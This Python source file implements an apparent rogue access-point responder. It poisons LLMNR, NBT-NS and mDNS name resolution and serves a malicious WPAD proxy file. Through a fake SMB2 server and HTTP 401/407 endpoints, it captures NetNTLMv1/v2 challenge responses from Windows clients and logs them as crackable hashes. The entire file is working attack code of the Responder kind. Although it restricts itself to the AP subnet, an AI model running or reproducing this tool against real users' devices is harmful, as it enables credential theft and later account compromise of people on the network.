#!/usr/bin/env python3
"""LambdaOS AP responder: WPAD + LLMNR/NBT-NS/mDNS poison + NetNTLM capture.

Runs on the AP host only. Answers name-resolution queries from AP clients so
that Windows background traffic (WPAD, explorer, Chrome, stale shares) lands
on the phone, then captures the NTLM challenge response from a fake SMB2
server, an HTTP 401/407 proxy and the WPAD PAC endpoint. Captures are appended
as JSON lines for the root worker; there is no relay and no cracking here.

Safety boundary: every packet and connection is checked against the AP subnet
(or loopback, for adb-forward tests). The upstream network is never poisoned.

SMB1 is not implemented: Windows 10/11 negotiate SMB2; add SMB1 only if an
SMB1-only client matters.
"""
import base64
import json
import os
import socket
import struct
import sys
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

IFACE, IP, OUT = sys.argv[1], sys.argv[2], sys.argv[3]
SUBNET = IP.rsplit(".", 1)[0] + "."
WORKGROUP = "WORKGROUP"
HOSTNAME = "LAMBDAOS"
PAC_PORT = 8079
PROXY_PORT = 3128
PAC = ("function FindProxyForURL(url, host) { return \"PROXY %s:%d; DIRECT\"; }\n"
       % (IP, PROXY_PORT)).encode()
LOCK = threading.Lock()


def log(*parts):
    print("[ntlm]", *parts, flush=True)


def local(addr):
    return addr.startswith(SUBNET) or addr.startswith("127.")


def capture(proto, src, user, domain, challenge, proof, blob=None, lm=b""):
    """Store one capture for the worker and show it in the console log."""
    user = user or "?"
    if blob is None:
        value = f"{user}::{domain}:{lm.hex()}:{proof.hex()}:{challenge.hex()}"
        kind = "netntlmv1"
    else:
        value = f"{user}::{domain}:{challenge.hex()}:{proof.hex()}:{blob.hex()}"
        kind = "netntlmv2"
    entry = {"t": int(time.time() * 1000), "proto": proto, "kind": kind,
             "ip": src, "user": user, "domain": domain, "hash": value}
    with LOCK:
        try:
            with open(OUT, "a", encoding="utf-8") as handle:
                handle.write(json.dumps(entry, separators=(",", ":")) + "\n")
        except OSError as exc:
            log("capture write failed", exc)
    log("capture", kind, proto, src, user)


# ---------------------------------------------------------------- NTLM helpers
def ntlm_type2(challenge):
    name = WORKGROUP.encode("utf-16-le")

    def av(ident, value):
        data = value.encode("utf-16-le")
        return struct.pack("<HH", ident, len(data)) + data

    info = (av(2, WORKGROUP) + av(1, HOSTNAME) + av(3, HOSTNAME + ".local")
            + av(4, "workgroup") + struct.pack("<HH", 0, 0))
    flags = 0xE28A8215  # unicode, NTLM, ESS, target info, version, 56/128
    off_name = 56
    off_info = off_name + len(name)
    message = b"NTLMSSP\x00" + struct.pack("<I", 2)
    message += struct.pack("<HHI", len(name), len(name), off_name)
    message += struct.pack("<I", flags) + challenge + b"\x00" * 8
    message += struct.pack("<HHI", len(info), len(info), off_info)
    message += bytes([10, 0, 0x61, 0x4A, 0, 0, 0, 0x0F])  # Windows 10.0.19041
    return message + name + info


def ntlm_token(buf):
    """Windows wraps NTLMSSP in SPNEGO on SMB; HTTP sends it bare."""
    index = buf.find(b"NTLMSSP\x00")
    return buf[index:] if index >= 0 else b""


def ntlm_type(token):
    if len(token) >= 12 and token[:8] == b"NTLMSSP\x00":
        return struct.unpack_from("<I", token, 8)[0]
    return 0


def ntlm_fields(token):
    """Returns (user, domain, nt_response, lm_response) from a Type 3 message."""
    lm_len, _, lm_off = struct.unpack_from("<HHI", token, 12)
    nt_len, _, nt_off = struct.unpack_from("<HHI", token, 20)
    dom_len, _, dom_off = struct.unpack_from("<HHI", token, 28)
    usr_len, _, usr_off = struct.unpack_from("<HHI", token, 36)
    nt = token[nt_off:nt_off + nt_len]
    lm = token[lm_off:lm_off + lm_len]
    domain = token[dom_off:dom_off + dom_len].decode("utf-16-le", "replace")
    user = token[usr_off:usr_off + usr_len].decode("utf-16-le", "replace")
    return user, domain, nt, lm


def handle_type3(proto, src, token, challenge):
    if len(token) < 64:
        return
    user, domain, nt, lm = ntlm_fields(token)
    if len(nt) == 24:
        capture(proto, src, user, domain, challenge, nt, None, lm)
    elif len(nt) > 16:
        capture(proto, src, user, domain, challenge, nt[:16], nt[16:])


def der_len(size):
    if size < 0x80:
        return bytes([size])
    raw = size.to_bytes((size.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def spnego(token):
    """NegTokenResp selecting NTLMSSP with the Type 2 challenge."""
    oid = bytes.fromhex("060a2b06010401823702020a")  # 1.3.6.1.4.1.311.2.2.10
    neg_state = b"\xa0\x03\x0a\x01\x01"  # accept-incomplete
    supported = b"\xa1" + der_len(len(oid)) + oid
    inner = b"\x04" + der_len(len(token)) + token
    response = b"\xa2" + der_len(len(inner)) + inner
    body = neg_state + supported + response
    body = b"\x30" + der_len(len(body)) + body
    return b"\xa1" + der_len(len(body)) + body


# --------------------------------------------------------------- SMB2 capture
SMB2_MAGIC = b"\xfeSMB"


def smb2_header(command, status, message_id, session=0):
    return (SMB2_MAGIC + struct.pack("<H", 64) + struct.pack("<H", 1)
            + struct.pack("<I", status) + struct.pack("<H", command)
            + struct.pack("<H", 1) + struct.pack("<I", 1)
            + struct.pack("<I", 0) + struct.pack("<Q", message_id)
            + struct.pack("<I", 0) + struct.pack("<I", 0)
            + struct.pack("<Q", session) + b"\x00" * 16)


def smb2_negotiate(message_id, dialect=0x0210):
    body = struct.pack("<HHHH", 65, 0x0001, dialect, 0)
    body += b"\x11" * 16 + struct.pack("<I", 0)
    body += struct.pack("<III", 1048576, 1048576, 1048576)
    body += struct.pack("<QQ", 0, 0) + struct.pack("<HHI", 0, 0, 0)
    return smb2_header(0, 0, message_id) + body


def smb1_dialects(message):
    """Dialect strings of an SMB1 negotiate request; empty for anything else."""
    if len(message) < 37 or message[:4] != b"\xffSMB" or message[4] != 0x72:
        return []
    count = struct.unpack_from("<H", message, 33)[0]
    data = message[35:35 + count]
    names = []
    for part in data.split(b"\x00"):
        part = part.lstrip(b"\x02")
        if part:
            names.append(part.decode("ascii", "replace"))
    return names


def smb2_session(message_id, status, token, session):
    body = struct.pack("<HHHH", 9, 0, 72 if token else 0, len(token)) + token
    return smb2_header(1, status, message_id, session) + body


def recv_exact(connection, size):
    data = b""
    while len(data) < size:
        chunk = connection.recv(size - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def smb_connection(connection, src):
    challenge = os.urandom(8)
    session = 0x4C414D42
    try:
        with connection:
            while True:
                header = recv_exact(connection, 4)
                if header is None or header[0] != 0:
                    return
                size = int.from_bytes(header[1:4], "big")
                if size < 64 or size > (1 << 20):
                    return
                message = recv_exact(connection, size)
                if message is None:
                    return
                if message[:4] != SMB2_MAGIC:
                    # SMB1 multi-protocol negotiate: advertise SMB2 so the
                    # client switches dialects (Windows with SMB1 enabled).
                    dialects = smb1_dialects(message)
                    if any(name.startswith("SMB 2.") for name in dialects):
                        rev = 0x02FF if "SMB 2.???" in dialects else 0x0202
                        reply = smb2_negotiate(0, rev)
                        connection.sendall(b"\x00" + len(reply).to_bytes(3, "big") + reply)
                        continue
                    return
                command = struct.unpack_from("<H", message, 12)[0]
                mid = struct.unpack_from("<Q", message, 24)[0]
                reply = None
                if command == 0:
                    reply = smb2_negotiate(mid)
                elif command == 1:
                    off, length = struct.unpack_from("<HH", message, 76)
                    token = ntlm_token(message[off:off + length]) if length else b""
                    if ntlm_type(token) == 3:
                        handle_type3("smb", src, token, challenge)
                        reply = smb2_session(mid, 0xC000006D, b"", session)
                    else:
                        # Type 1, or an SPNEGO Kerberos attempt: select NTLM.
                        reply = smb2_session(mid, 0xC0000016, spnego(ntlm_type2(challenge)), session)
                else:
                    reply = smb2_header(command, 0xC00000BB, mid, session)
                connection.sendall(b"\x00" + len(reply).to_bytes(3, "big") + reply)
                if reply is not None and reply[8:12] == struct.pack("<I", 0xC000006D):
                    return
    except OSError:
        pass


def smb_server():
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("0.0.0.0", 445))
    listener.listen(16)
    log("smb listening 445")
    while True:
        connection, source = listener.accept()
        if not local(source[0]):
            connection.close()
            continue
        threading.Thread(target=smb_connection, args=(connection, source[0]), daemon=True).start()


# ------------------------------------------------------------ HTTP / WPAD / proxy
class LambdaServer(ThreadingHTTPServer):
    daemon_threads = True
    mode = "http"


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "LambdaOS"
    challenge: bytes | None = None

    def log_message(self, format, *args):
        log("http", self.client_address[0], format % args)

    def _reply(self, code, header, token=None, close=False):
        self.send_response(code)
        self.send_header(header, "NTLM" if token is None else "NTLM " + base64.b64encode(token).decode())
        self.send_header("Content-Length", "0")
        if close:
            self.send_header("Connection", "close")
            self.close_connection = True
        self.end_headers()

    def _serve(self, method):
        source = self.client_address[0]
        path = self.path.split("?")[0]
        mode = getattr(self.server, "mode", "http")
        if mode == "pac" or (mode == "http" and path.lower().endswith("wpad.dat")):
            body = PAC
            self.send_response(200)
            self.send_header("Content-Type", "application/x-ns-proxy-autoconfig")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            if method != "HEAD":
                self.wfile.write(body)
            return
        if not local(source):
            self.close_connection = True
            return
        header = "Proxy-Authorization" if mode == "proxy" else "Authorization"
        offered = self.headers.get(header, "")
        challenge_header = "Proxy-Authenticate" if mode == "proxy" else "WWW-Authenticate"
        code = 407 if mode == "proxy" else 401
        if offered.upper().startswith("NTLM "):
            try:
                token = base64.b64decode(offered[5:].strip() + "===")
            except Exception:
                token = b""
            if ntlm_type(token) == 3 and self.challenge is not None:
                handle_type3(mode, source, token, self.challenge)
                self._reply(code, challenge_header, close=True)
                return
            if self.challenge is None:
                self.challenge = os.urandom(8)
            self._reply(code, challenge_header, ntlm_type2(self.challenge))
            return
        if self.challenge is None:
            self.challenge = os.urandom(8)
        self._reply(code, challenge_header)

    def do_GET(self):
        self._serve("GET")

    def do_HEAD(self):
        self._serve("HEAD")

    def do_POST(self):
        self._serve("POST")

    def do_CONNECT(self):
        self._serve("CONNECT")


def http_server(port, mode):
    server = LambdaServer(("0.0.0.0", port), Handler)
    server.mode = mode
    log("http listening", port, mode)
    server.serve_forever()


# ------------------------------------------------------- name resolution poison
def llmnr_loop():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", 5355))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,
                    socket.inet_aton("224.0.0.252") + socket.inet_aton(IP))
    log("llmnr listening")
    while True:
        try:
            data, source = sock.recvfrom(1500)
            if not local(source[0]) or source[0] == IP or len(data) < 12:
                continue
            flags, questions = struct.unpack_from(">HH", data, 2)
            if flags & 0x8000 or questions != 1:
                continue
            index = 12
            while index < len(data) and data[index]:
                index += 1 + data[index]
            if index + 5 > len(data):
                continue
            qtype = struct.unpack_from(">H", data, index + 1)[0]
            if qtype != 1:
                continue
            question = data[12:index + 5]
            reply = data[:2] + struct.pack(">HHHHH", 0x8000, 1, 1, 0, 0) + question
            reply += b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 30, 4) + socket.inet_aton(IP)
            sock.sendto(reply, source)
        except OSError:
            continue


def nbtns_loop():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", 137))
    log("nbtns listening")
    while True:
        try:
            data, source = sock.recvfrom(1500)
            if not local(source[0]) or source[0] == IP or len(data) < 12 + 34:
                continue
            flags, questions, answers = struct.unpack_from(">HHH", data, 2)
            if flags & 0x8000 or questions != 1 or answers:
                continue
            if struct.unpack_from(">H", data, 44)[0] != 0x0020:  # NB name query
                continue
            name = data[12:44]
            reply = data[:2] + struct.pack(">HHHHH", 0x8500, 1, 1, 0, 0)
            reply += data[12:46]
            reply += name + struct.pack(">HHIH", 0x0020, 0x0001, 60, 6)
            reply += struct.pack(">H", 0x0000) + socket.inet_aton(IP)
            sock.sendto(reply, source)
        except OSError:
            continue


def read_name(data, offset):
    labels = []
    while offset < len(data):
        size = data[offset]
        if size == 0:
            return ".".join(labels), offset + 1
        if size & 0xC0 or size > 63:
            return None, offset
        labels.append(data[offset + 1:offset + 1 + size].decode("ascii", "replace"))
        offset += 1 + size
        if len(labels) > 16:
            return None, offset
    return None, offset


def mdns_loop():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", 5353))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,
                    socket.inet_aton("224.0.0.251") + socket.inet_aton(IP))
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_IF, socket.inet_aton(IP))
    log("mdns listening")
    while True:
        try:
            data, source = sock.recvfrom(1500)
            if not local(source[0]) or source[0] == IP or len(data) < 12:
                continue
            flags, questions = struct.unpack_from(">HH", data, 2)
            if flags & 0x8000 or questions != 1:
                continue
            name, index = read_name(data, 12)
            if name is None or not name.lower().endswith(".local") or index + 4 > len(data):
                continue
            qtype = struct.unpack_from(">H", data, index)[0]
            if qtype not in (1, 255):
                continue
            question = data[12:index + 4]
            reply = struct.pack(">HHHHHH", 0, 0x8400, 1, 1, 0, 0) + question
            reply += b"\xc0\x0c" + struct.pack(">HHIH", 1, 0x8001, 120, 4) + socket.inet_aton(IP)
            sock.sendto(reply, ("224.0.0.251", 5353))
        except OSError:
            continue


# ------------------------------------------------------------------------- main
def main():
    for target, name in ((smb_server, "smb"), (lambda: http_server(PAC_PORT, "pac"), "pac"),
                         (lambda: http_server(PROXY_PORT, "proxy"), "proxy"),
                         (llmnr_loop, "llmnr"), (nbtns_loop, "nbtns"), (mdns_loop, "mdns")):
        threading.Thread(target=lambda f=target, n=name: guarded(f, n), daemon=True).start()
    try:
        http_server(80, "http")  # skipped when the captive portal owns port 80
    except OSError:
        log("port 80 busy (captive portal?); WPAD stays on", PAC_PORT)


def guarded(func, name):
    try:
        func()
    except Exception as exc:  # a missing feature must not kill the others
        log(name, "failed:", exc)


if __name__ == "__main__":
    main()
    while True:
        time.sleep(3600)
